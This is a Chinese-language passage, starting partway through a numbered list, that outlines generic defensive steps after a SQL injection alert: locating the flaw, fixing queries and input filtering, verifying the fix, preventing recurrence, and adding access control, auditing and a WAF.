2. 定位漏洞：确认告警存在后，需要进行漏洞定位，以查找漏洞原因和具体位置，检查SQL查询参数、输入过滤、数据库配置等方面。
3. 修复漏洞：根据定位得到的漏洞内容，进行相应的安全加固和漏洞修复，比如优化SQL查询语句、加强输入过滤、修复数据库配置等。
4. 验证修复结果：在修复漏洞后，需要再次测试系统以验证修复结果，确保系统安全性得到提高。
5. 预防未来漏洞：在修复漏洞之后，需要对SQL注入漏洞进一步加强防范和监测，避免类似漏洞重演。

需要注意的是，上述过程应该配合严格的访问控制和身份认证机制，并进行安全审计来保证系统的安全性。另外，如果使用天眼监测到SQL注入漏洞的话，可以结合其他安全工具如WAF来对系统进行进一步防御。通过不断加强安全防护链的研发和落地，能让系统安全得到有力地提升。